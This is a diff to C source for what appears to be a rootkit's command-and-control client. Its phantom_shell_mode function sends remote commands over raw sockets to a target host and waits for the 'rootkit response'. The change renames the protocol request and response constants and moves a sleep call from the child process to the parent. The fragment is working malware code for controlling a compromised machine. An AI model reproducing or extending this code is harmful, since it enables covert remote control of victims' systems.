@@ -111,7 +111,7 @@ int phantom_shell_mode(char* buf, char* local_ip, char* dest){
 	}
 
 	char* request = calloc(4096, sizeof(char));
-	strcpy(request, CC_PROT_BASH_COMMAND_REQUEST);
+	strcpy(request, CC_PROT_PHANTOM_COMMAND_REQUEST);
 	strcat(request, buf);
     packet_t packet;
     pid_t pid = fork();
@@ -120,7 +120,6 @@ int phantom_shell_mode(char* buf, char* local_ip, char* dest){
         return 1;
     }
     if(pid==0){
-        sleep(5);
         packet = build_standard_packet(8000, 9000, local_ip, dest, 4096, request);
         //printf("Sending %s\n", msg);
         if(rawsocket_send(packet)<0){
@@ -129,11 +128,12 @@ int phantom_shell_mode(char* buf, char* local_ip, char* dest){
         }
         exit(0);
     }
+    sleep(5);
     printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
     packet = rawsocket_sniff_pattern(CC_PROT_BASELINE);
     char* res = packet.payload;
     //TODO make the shell to fork and wait for response, but accept new requests meanwhile
-    if(strncmp(res, CC_PROT_BASH_COMMAND_RESPONSE, strlen(CC_PROT_BASH_COMMAND_RESPONSE))==0){
+    if(strncmp(res, CC_PROT_PHANTOM_COMMAND_RESPONSE, strlen(CC_PROT_PHANTOM_COMMAND_RESPONSE))==0){
         //Received a response
         char *p;
         p = strtok(buf, "#");
